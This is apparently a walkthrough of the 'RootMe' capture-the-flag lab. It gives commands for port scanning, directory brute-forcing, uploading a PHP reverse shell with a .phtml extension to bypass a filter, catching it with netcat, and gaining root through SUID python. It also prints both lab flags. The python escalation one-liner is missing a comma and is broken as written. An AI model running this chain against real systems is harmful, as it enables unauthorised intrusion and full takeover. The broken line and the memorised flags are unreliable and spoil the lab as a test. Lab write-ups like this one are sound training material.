# RootMe


## Reconnaissance
1. shows there are 2 ports open: ssh/http
> nmap -sC -sV <ip>
	
2. shows there is a secret page /panel and /uploads (where you can upload things)
> gobuster (-e -u) http://<ip>/ (-w) /usr/share/wordlists/dirb/common.txt (or some other wordlist) 
	
3. upload php-reverse-shell on the /panel/ (change the extension from .php to .phtml)
4. run command to 'execute' reverse shell
> curl http://<ip>/uploads/<name of reverse shell>
	
5. set up netcat listener to catch the shell
> nc -lvnp <port>
	
6. upgrade shell using
> python -c 'import pty;pty.spawn("/bin/bash")'
>> (^Z + stty raw -echo + rerun netcat listener + export TERM=xterm)
	
7. search for the user flag
> find / -type f -name user.txt
--> shows /var/www/user.txt

8. gives the flag THM{y0u_g0t_a_sh3ll}
> cat /var/www/user.txt
	
9. look for SUID permissions
> find / -type f -user root -perm -4000 2>/dev/null
>> / searches whole file system
>> -perm searches for files with specific permissions
>> 2>/dev/null supresses errors
	
10. shows a suspicious user
> /usr/bin/python
	
11. go to <https://gtfobins.github.io/> and look for privilege escalations to elevate privileges --> search python + SUID
> python -c 'import os; os.execl("/bin/sh" "sh", "-p")'

12. now we should have access to root (run whoami)
13. navigate to root folder and print contents of root.txt
> cd /root
> cat root.txt
	
14. received flag THM{pr1v1l3g3_3sc4l4t10n}

